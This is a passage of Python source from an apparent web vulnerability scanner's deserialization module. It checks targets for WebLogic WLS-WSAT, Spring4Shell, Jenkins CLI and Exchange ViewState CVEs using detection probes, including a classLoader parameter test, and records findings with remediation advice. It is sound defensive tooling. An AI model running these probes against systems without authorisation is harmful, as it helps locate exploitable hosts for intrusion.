            await rate_limiter.acquire()
            try:
                wls_wsat_url = urljoin(base_url, "/wls-wsat/CoordinatorPortType")
                response = await client.get(wls_wsat_url)

                if response.status_code == 200 or "wls-wsat" in response.text.lower():
                    findings.append(Finding(
                        name="WebLogic WLS-WSAT Endpoint (CVE-2017-10271)",
                        severity=Severity.CRITICAL,
                        confidence_score=85.0,
                        description="WLS-WSAT endpoint accessible - vulnerable to XMLDecoder RCE",
                        endpoint=wls_wsat_url,
                        evidence=["WLS-WSAT endpoint responds"],
                        cwe_id="CWE-502",
                        cvss_score=9.8,
                        remediation="Apply Oracle Critical Patch Update or disable WLS-WSAT.",
                    ))
            except Exception as e:
                logger.debug(f"Error testing WebLogic CVE: {e}")

        if "spring" in framework.name.lower():
            # CVE-2022-22965 - Spring4Shell
            await rate_limiter.acquire()
            try:
                # Test class.module.classLoader access
                test_url = f"{base_url}?class.module.classLoader.URLs%5B0%5D=test"
                response = await client.get(test_url)

                if "classLoader" in response.text or response.status_code == 400:
                    findings.append(Finding(
                        name="Potential Spring4Shell (CVE-2022-22965)",
                        severity=Severity.CRITICAL,
                        confidence_score=65.0,
                        description="Spring application may be vulnerable to Spring4Shell",
                        endpoint=base_url,
                        evidence=["ClassLoader parameter binding detected"],
                        cwe_id="CWE-94",
                        cvss_score=9.8,
                        remediation="Update to Spring Framework 5.3.18+ or 5.2.20+.",
                    ))
            except Exception as e:
                logger.debug(f"Error testing Spring4Shell: {e}")

        if "jenkins" in framework.name.lower():
            # CVE-2017-1000353 - Jenkins CLI
            await rate_limiter.acquire()
            try:
                cli_url = urljoin(base_url, "/cli")
                response = await client.get(cli_url)

                if response.status_code == 200:
                    findings.append(Finding(
                        name="Jenkins CLI Endpoint Accessible",
                        severity=Severity.HIGH,
                        confidence_score=85.0,
                        description="Jenkins CLI endpoint detected - check for deserialization CVEs",
                        endpoint=cli_url,
                        evidence=["CLI endpoint accessible"],
                        cwe_id="CWE-502",
                        cvss_score=9.8,
                        remediation="Disable CLI over HTTP/HTTPS. Update Jenkins.",
                    ))
            except Exception as e:
                logger.debug(f"Error testing Jenkins: {e}")

        if "exchange" in framework.name.lower():
            # CVE-2020-0688 - Exchange ECP ViewState
            await rate_limiter.acquire()
            try:
                ecp_url = urljoin(base_url, "/ecp/default.aspx")
                response = await client.get(ecp_url)

                if "__VIEWSTATE" in response.text:
                    # Check for static machine key indicators
                    generator_match = re.search(
                        r'__VIEWSTATEGENERATOR[^"]*value="([^"]*)"',
                        response.text
                    )
                    if generator_match:
                        findings.append(Finding(
                            name="Exchange ECP ViewState (CVE-2020-0688)",
                            severity=Severity.CRITICAL,
                            confidence_score=65.0,
                            description="Exchange ECP with ViewState - check for CVE-2020-0688",
                            endpoint=ecp_url,
                            evidence=[
                                f"ViewStateGenerator: {generator_match.group(1)}",
                                "If machine key is static, RCE is possible",
                            ],
                            cwe_id="CWE-502",
                            cvss_score=8.8,
                            remediation="Apply Exchange security updates. Verify unique machine keys.",
                        ))
            except Exception as e:
                logger.debug(f"Error testing Exchange: {e}")

        return findings


# ===========================================================================
# Bind format-specific test methods from their respective modules
# ===========================================================================
from scanning.modules.deserialization.formats.java import _test_java_deserialization
from scanning.modules.deserialization.formats.php import _test_php_object_injection
from scanning.modules.deserialization.formats.dotnet import _test_viewstate, _test_dotnet_jsonnet
from scanning.modules.deserialization.formats.python_formats import _test_python_pickle, _test_python_yaml
from scanning.modules.deserialization.formats.ruby import _test_ruby_deserialization
from scanning.modules.deserialization.formats.node import _test_node_serialize

DeserializationScanner._test_java_deserialization = _test_java_deserialization
DeserializationScanner._test_php_object_injection = _test_php_object_injection
DeserializationScanner._test_viewstate = _test_viewstate
DeserializationScanner._test_dotnet_jsonnet = _test_dotnet_jsonnet
DeserializationScanner._test_python_pickle = _test_python_pickle
DeserializationScanner._test_python_yaml = _test_python_yaml
DeserializationScanner._test_ruby_deserialization = _test_ruby_deserialization
DeserializationScanner._test_node_serialize = _test_node_serialize
